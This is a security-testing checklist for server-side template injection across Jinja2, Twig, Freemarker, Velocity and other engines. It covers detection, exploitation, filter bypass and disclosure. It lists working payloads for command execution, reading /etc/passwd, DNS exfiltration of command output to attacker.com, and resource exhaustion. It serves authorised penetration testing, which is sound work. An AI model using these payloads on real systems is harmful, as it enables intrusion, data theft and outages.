# 🔍 SERVER-SIDE TEMPLATE INJECTION (SSTI) TESTING CHECKLIST

 ## Comprehensive Server-Side Template Injection Testing

### 1 Template Engine Identification
    - Common Template Engine Detection:
      * Smarty (PHP): {7*7}, {php}phpinfo(){/php}
      * Twig (PHP): {{7*7}}, {{7*'7'}}
      * Jinja2 (Python): {{7*7}}, {{config}}
      * Django Templates (Python): {{7*7}}, {% debug %}
      * Freemarker (Java): ${7*7}, #{7*7}
      * Velocity (Java): #set($x=7*7)${x}
      * Thymeleaf (Java): [[${7*7}]], ${7*7}
      * Handlebars (JavaScript): {{7*7}}
      * EJS (JavaScript): <%= 7*7 %>
      * Pug/Jade (JavaScript): #{7*7}, = 7*7

    - Detection Payloads:
      * Mathematical operations: ${7*7}, {{7*7}}, #{7*7}
      * String operations: ${"7"*7}, {{"7"*7}}
      * Environment variables: ${env}, {{env}}
      * Object dumping: ${object}, {{object}}

    - Error-Based Identification:
      * Invalid syntax to trigger engine-specific errors
      * Missing variable errors for engine identification
      * Template parsing error analysis
      * Stack trace examination for engine details

### 2 Basic SSTI Payload Testing
    - Mathematical Expression Testing:
      * Simple arithmetic: ${7*7}, {{7*7}}
      * Complex calculations: ${7*7*7}, {{7*7*7}}
      * Floating point: ${7/7}, {{7/7}}
      * Modulus operations: ${7%2}, {{7%2}}

    - String Operations:
      * String concatenation: ${"a"+"b"}, {{"a"+"b"}}
      * String repetition: ${"A"*7}, {{"A"*7}}
      * String interpolation: ${"7*7=${7*7}"}
      * Character access: ${"abc"[0]}, {{"abc"[0]}}

    - Boolean and Logical Operations:
      * Boolean expressions: ${true}, ${false}
      * Logical operators: ${true and false}, ${true or false}
      * Comparison operators: ${7==7}, ${7>5}

### 3 Code Execution Testing
    - OS Command Execution:
      * System command execution: ${os.system('id')}
      * Process execution: ${runtime.exec('whoami')}
      * Shell command execution: {{''.__class__.__mro__[1].__subclasses__()[408]('whoami',shell=True,stdout=-1).communicate()[0]}}
      * Command execution with output capture

    - File System Access:
      * File reading: ${FileUtils.readFileToString(new File('/etc/passwd'))}
      * Directory listing: ${new java.io.File('.').list()}
      * File writing: {{''.__class__.__mro__[1].__subclasses__()[40]('/tmp/test','w').write('test')}}
      * File existence checking

    - Network Operations:
      * HTTP requests: ${new URL('http://attacker.com').content}
      * Socket connections: ${new Socket('attacker.com',80)}
      * DNS lookups: ${InetAddress.getByName('attacker.com')}

### 4 Object Chain Exploitation
    - Python Object Chains:
      * Class hierarchy traversal: {{''.__class__}}
      * Method resolution order: {{''.__class__.__mro__}}
      * Subclass exploration: {{''.__class__.__mro__[1].__subclasses__()}}
      * Built-in function access: {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__}}

    - Java Object Chains:
      * Class loader access: ${class.getClassLoader()}
      * Runtime access: ${runtime.exec('whoami')}
      * Process builder: ${new ProcessBuilder('whoami').start()}
      * Reflection capabilities

    - PHP Object Chains:
      * Built-in function access: {{_self.env.getFilter("exec")}}
      * Class instantiation: {{_self.env.registerUndefinedFilterCallback("exec")}}
      * Method invocation through arrays

### 5 Template Engine-Specific Testing
    - Jinja2 (Python) Testing:
      * Config access: {{config}}
      * Built-in functions: {{lipsum.__globals__}}
      * OS module access: {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os']}}
      * Subprocess access for command execution

    - Twig (PHP) Testing:
      * _self environment access: {{_self}}
      * Filter callback registration
      * Template context manipulation
      * Function callbacks

    - Freemarker (Java) Testing:
      * Built-in directives: <#assign ex = "freemarker.template.utility.Execute"?new()>${ex("whoami")}
      * Object wrapping: ${object?api}
      * Class instantiation capabilities

    - Velocity (Java) Testing:
      * Runtime execution: #set($x=$h.class.forName("java.lang.Runtime").getRuntime().exec("whoami"))
      * Class loader manipulation
      * Method invocation techniques

### 6 Context-Aware SSTI Testing
    - Expression Context Testing:
      * ${...} expression context
      * #{...} expression context
      * {{...}} expression context
      * {% .. %} statement context
      * Directive context testing

    - Template Block Testing:
      * If statement injection: {% if 7*7 == 49 %}true{% endif %}
      * For loop manipulation: {% for i in range(7) %}{{i}}{% endfor %}
      * Variable assignment: {% set x = 7*7 %}{{x}}
      * Include directives: {% include 'file.txt' %}

    - Filter and Function Testing:
      * Filter chaining: {{"test"|upper|reverse}}
      * Custom filter exploitation
      * Function parameter injection
      * Method call manipulation

### 7 Advanced Exploitation Techniques
    - Blind SSTI Detection:
      * Time-based detection: {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['time'].sleep(5)}}
      * DNS-based exfiltration: {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].system('nslookup $(whoami).attacker.com')}}
      * HTTP-based exfiltration with command output
      * Boolean-based blind injection

    - Sandbox Escape Techniques:
      * Python sandbox escape via subclasses
      * Java sandbox escape via reflection
      * JavaScript sandbox escape via prototype pollution
      * Template engine sandbox configuration bypass

    - Memory and Resource Attacks:
      * Memory exhaustion: {{range(1000000)}}
      * CPU exhaustion: {{7**7**7}}
      * Infinite loop creation
      * Recursive template inclusion

### 8 Application Framework Testing
    - Web Framework Integration:
      * Spring Boot with Thymeleaf
      * Django with Django Templates
      * Flask with Jinja2
      * Express.js with EJS/Pug
      * Laravel with Blade

    - CMS Template Testing:
      * WordPress theme template injection
      * Drupal Twig template manipulation
      * Joomla template overrides
      * Magento template directives

    - Enterprise Application Testing:
      * Email template injection
      * Report template manipulation
      * Document generation templates
      * Notification template systems

### 9 Defense Bypass Testing
    - Input Filter Evasion:
      * Encoding variations: URL, HTML, Unicode
      * Case manipulation and mixing
      * Whitespace obfuscation
      * Comment injection within templates
      * Multiple encoding layers

    - Sandbox Bypass Techniques:
      * Restricted function access bypass
      * Blacklisted class/method bypass
      * Whitelist circumvention
      * Parser differential exploitation

    - WAF Bypass Methods:
      * Token fragmentation
      * Alternative syntax patterns
      * Template engine specific obfuscation
      * Protocol-level evasion

### 10 Information Disclosure Testing
    - Environment Information:
      * Environment variables: {{env}}
      * System properties: {{java.lang.System.getProperties()}}
      * Configuration data: {{config}}
      * Application settings

    - Class and Method Discovery:
      * Available classes and methods
      * Class hierarchy exploration
      * Method parameter discovery
      * Object property enumeration

    - File System Information:
      * Current directory: {{os.getcwd()}}
      * File listings: {{os.listdir('.')}}
      * File contents reading
      * Directory traversal through templates

### 11 Privilege Escalation Testing
    - Application Context Escalation:
      * Service account privilege testing
      * Database access through templates
      * File system write capabilities
      * Network access level testing

    - System-Level Escalation:
      * Command execution privilege level
      * File system access permissions
      * Network service access
      * User context manipulation

#### Testing Tools and Methodologies:
    Manual Testing Tools:
    - Burp Suite with SSTI scanner extensions
    - OWASP ZAP with custom template payloads
    - Custom Python scripts for engine detection
    - Browser developer tools for response analysis

    Automated Testing Tools:
    - tplmap (automated SSTI tool)
    - Custom SSTI fuzzing frameworks
    - Template engine specific scanners
    - Security scanner SSTI plugins

    Specialized Testing Tools:
    - SSTI payload generators
    - Template engine emulators
    - Sandbox escape testing tools
    - Code analysis for template usage

    Test Case Examples:
    - Detection: {{7*7}}, ${7*7}, #{7*7}
    - Python: {{''.__class__.__mro__[1].__subclasses__()[408]('whoami',shell=True,stdout=-1).communicate()[0]}}
    - Java: ${T(java.lang.Runtime).getRuntime().exec('whoami')}
    - PHP: {php}echo `whoami`;{/php}
    - Blind: {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['time'].sleep(5)}}

    Testing Methodology:
    1. Identify template rendering points
    2. Test basic template expressions
    3. Identify template engine type
    4. Test engine-specific payloads
    5. Attempt code execution
    6. Test object chain exploitation
    7. Verify information disclosure
    8. Attempt privilege escalation
    9. Test defense bypass techniques
    10. Document exploitation paths and impact

    Protection Mechanisms Testing:
    - Template engine security settings
    - Input validation effectiveness
    - Sandbox configuration testing
    - Output encoding verification
    - Template context isolation